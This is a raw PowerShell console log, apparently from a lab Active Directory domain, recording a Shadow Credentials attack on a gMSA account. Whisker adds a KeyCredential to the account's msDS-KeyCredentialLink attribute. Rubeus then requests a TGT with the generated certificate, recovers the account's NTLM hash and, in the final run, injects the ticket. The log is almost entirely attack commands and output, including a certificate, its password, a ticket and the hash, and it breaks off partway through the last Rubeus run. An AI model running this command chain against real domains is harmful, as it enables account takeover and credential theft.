PS C:\tools> .\Whisker.exe add /target:testGMSA2$
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password yvQxPfv13WjYxw66
[*] Searching for the target account
[*] Target user found: CN=testGMSA2,OU=ShadowCreds2,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID a9aa2356-6d9d-4a18-870f-e5b222eef7f3
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:testGMSA2$ /certificate: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 /password:"yvQxPfv13WjYxw66" /domain:mindfreak.lab.la
n /dc:CrissDC01.mindfreak.lab.lan /getcredentials /show

PS C:\tools> .\Rubeus.exe asktgt /user:testGMSA2$ /certificate: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 /password:"yvQxPfv13WjYxw66" /domain:mindfreak.lab.lan /dc:CrissDC01.mindfreak.lab.lan /getcredentials /show

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=testGMSA2$ 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mindfreak.lab.lan\testGMSA2$'
[*] Using domain controller: 10.10.10.90:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGlDCCBpCgAwIBBaEDAgEWooIFmDCCBZRhggWQMIIFjKADAgEFoRMbEU1JTkRGUkVBSy5MQUIuTEFO
      oiYwJKADAgECoR0wGxsGa3JidGd0GxFtaW5kZnJlYWsubGFiLmxhbqOCBUYwggVCoAMCARKhAwIBA6KC
      BTQEggUwOQ6OHVp0qq096y98xR+VoyC2mSz3owezomtOaLrIV2GpQ7uxl2OkDmX3Bihz00Z3xn4sx0bA
      q2e0f2stRW5j01FmlTuewClYs3mggSDUL7/xCtf0cx85rHbw6m5DHi9b66pBEzZzOhOde0NMYURT4bWz
      8o04qA7vtXXmEUzgA0FbGeKvo01HBDeKEUtv0gyuEON/oWyvPZr/5iE/xn16S8Ny/DQwShktFizRbBlt
      OR7v4kdgi5U3B8oL/hVcf5opWaXVd6+qrW6LMUkVdDBLjSfW/v71OHGyF5RpjpG5KVhHW90dTsT+zEya
      XmojABJ+rBn2od2lqp2lG2eYOGnyTrWRbrBRB2WcdibgQdVGzSKOwfLesj0DZuaQS2vX6lWNaDrvn5KW
      NRNLKhDxKP9L2egx86D9WyA9kG2icvnzjJfjB7q2jsz4LSssRbkADReUETCkGWcrE2C+9cpOtXkZWZ3a
      SYE5GtSOWnIMqmCOQdu1aHypPtle41eTu5gNCc94UEQo/t7YCY0jOT8FGfMnY6xd4t9xQxp7SM3aLZaa
      UgIHOuQaAhP0eeKQEGo9vdEhn1ZxCIFa2hVb6x1IgMggvqNZWI+mVfsI+83CMK4/4q+cH4xf7TaUqZ2o
      BP9wZ5hapmUrgOSJRb6XunDaSmI6c8b5Ob7WohNf7N+cDi5ejeB4/kxFCk5uiuGSSsDZWym8SBjcR+vw
      CO0L7BqYCC0VwwhMjNOPFwwQnjHa8KkMuX3mMN03kwSdVMy0ONfhxUOI8xt4SNYRr+0CqhUkMCyTOVEv
      OymIwtfjH2xmEbR58RH7P3xBVXirWIDFHXSRpBHt2c9wDVJLiYsQnzu4bluHyobov79StPm/J+6h5xyb
      wdgOaDSfmMYTjmfLmDnw2Bc3ixUxTe1NPVjn6E40HdjJWx/nTAQD9CCPn1RvtvWv8vy2aNi9pO6XtnBR
      fJL1JHiZarVE2IUVJKw3p04siem0CKCmmKSAM3lytLwoD/SqmC9FvqRNnBeCKu2a8Cz1KaZmSiwfgGDf
      5T3UHpJLso4LoDjprB11FU9IZTyrjFifj3PrS6tQ9I4egC6Hwj3qRO/7O6Ih8CKrwhnss8QsgJLeXeLk
      snfDmsn3jDt3VrkaV5IesUb/la12s1GF1lAVo8Lay5iuEyWHm2FQDRkIK8XJsrOfG2u3Z+gMzD0MfoR4
      WpYbpqz0EcYaOScz9mNAKpQ4y4x4Yb5UX2duYDcsXrx5Yjk7Ff+XvJTRATyVYGue7BaQLMf1zxmdeh2+
      /0nm9fmFh7VhMG81BZgUQj2eSwdED04bs4hSUfVNUMGlsLrDj8bruRRRZuSc6FcjEYyeiT1G2eCLUqYn
      q+E3paS0UEXxrJBNdv+cjwnuH6jWo3JrT4XdwfdVT4ZDIQG5lpjBZUVlB3ii2DK0s9zif09HlbHpJlQE
      9GMZZYmadKX3rcAOGpGX9e2BQAfgUwKe/A+AbJzbKejlsi2oGQ3Q+P07NnxyV/ojeZZuRzRgNOJcC/MJ
      EZTHYdBnlbqy1rrahL0hLfGZxHFXicZKSDeN4l6n1cS3MWMyI8c+UmKxn1P4BRb/HohbpIT2ntxTSVJ6
      CcTtM8IBtCPjknhK1cKKlurTrO5G5YGFM0jk3biDwKVvb2MYjb9HidoWb1j1hdLgzakrrXgojFN0lGay
      YhzRyVwF/tkf7hM/titmTx/kBDdys4y0c6XXk2fq3BDdHUT9iO2DlexQ+Xw19DSNGXpP/iPbZJIxonBT
      BSwYCyZ2IREmCCaZKF6jgecwgeSgAwIBAKKB3ASB2X2B1jCB06CB0DCBzTCByqAbMBmgAwIBF6ESBBDY
      LijQxoSDoLRrbiEbODL+oRMbEU1JTkRGUkVBSy5MQUIuTEFOohcwFaADAgEBoQ4wDBsKdGVzdEdNU0Ey
      JKMHAwUAQOEAAKURGA8yMDI1MTIxNzE1MDYyMlqmERgPMjAyNTEyMTgwMTA2MjJapxEYDzIwMjUxMjI0
      MTUwNjIyWqgTGxFNSU5ERlJFQUsuTEFCLkxBTqkmMCSgAwIBAqEdMBsbBmtyYnRndBsRbWluZGZyZWFr
      LmxhYi5sYW4=

  ServiceName              :  krbtgt/mindfreak.lab.lan
  ServiceRealm             :  MINDFREAK.LAB.LAN
  UserName                 :  testGMSA2$ (NT_PRINCIPAL)
  UserRealm                :  MINDFREAK.LAB.LAN
  StartTime                :  12/17/2025 9:06:22 AM
  EndTime                  :  12/17/2025 7:06:22 PM
  RenewTill                :  12/24/2025 9:06:22 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  2C4o0MaEg6C0a24hGzgy/g==
  ASREP (key)              :  C6D638DA7D784AF2472D6044FD6A5FD8

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : CE626CA767E719E01B443D34A7F72451

PS C:\tools> klist

Current LogonId is 0:0x16c18ee1

Cached Tickets: (6)

#0>	Client: jsykora @ MINDFREAK.LAB.LAN
	Server: krbtgt/MINDFREAK.LAB.LAN @ MINDFREAK.LAB.LAN
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 12/17/2025 8:50:52 (local)
	End Time:   12/17/2025 18:46:43 (local)
	Renew Time: 12/24/2025 8:46:43 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x42 -> DELEGATION FAST 
	Kdc Called: CrissDC01.mindfreak.lab.lan

#1>	Client: jsykora @ MINDFREAK.LAB.LAN
	Server: krbtgt/MINDFREAK.LAB.LAN @ MINDFREAK.LAB.LAN
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 12/17/2025 8:46:43 (local)
	End Time:   12/17/2025 18:46:43 (local)
	Renew Time: 12/24/2025 8:46:43 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x41 -> PRIMARY FAST 
	Kdc Called: CrissDC01.mindfreak.lab.lan

#2>	Client: jsykora @ MINDFREAK.LAB.LAN
	Server: host/CrissDC01.mindfreak.lab.lan @ MINDFREAK.LAB.LAN
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
	Start Time: 12/17/2025 8:46:44 (local)
	End Time:   12/17/2025 18:46:43 (local)
	Renew Time: 12/24/2025 8:46:43 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x40 -> FAST 
	Kdc Called: CrissDC01.mindfreak.lab.lan

#3>	Client: jsykora @ MINDFREAK.LAB.LAN
	Server: RPCSS/CrissDC01.mindfreak.lab.lan @ MINDFREAK.LAB.LAN
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
	Start Time: 12/17/2025 8:46:44 (local)
	End Time:   12/17/2025 18:46:43 (local)
	Renew Time: 12/24/2025 8:46:43 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x40 -> FAST 
	Kdc Called: CrissDC01.mindfreak.lab.lan

#4>	Client: jsykora @ MINDFREAK.LAB.LAN
	Server: ldap/CrissDC01.mindfreak.lab.lan @ MINDFREAK.LAB.LAN
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
	Start Time: 12/17/2025 8:46:43 (local)
	End Time:   12/17/2025 18:46:43 (local)
	Renew Time: 12/24/2025 8:46:43 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x40 -> FAST 
	Kdc Called: CrissDC01.mindfreak.lab.lan

#5>	Client: jsykora @ MINDFREAK.LAB.LAN
	Server: LDAP/CrissDC01.mindfreak.lab.lan/mindfreak.lab.lan @ MINDFREAK.LAB.LAN
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
	Start Time: 12/17/2025 8:46:43 (local)
	End Time:   12/17/2025 18:46:43 (local)
	Renew Time: 12/24/2025 8:46:43 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x40 -> FAST 
	Kdc Called: CrissDC01.mindfreak.lab.lan

PS C:\tools> .\Rubeus.exe asktgt /user:testGMSA2$ /certificate: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 /password:"yvQxPfv13WjYxw66" /domain:mindfreak.lab.lan /dc:CrissDC01.mindfreak.lab.lan /getcredentials /show /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
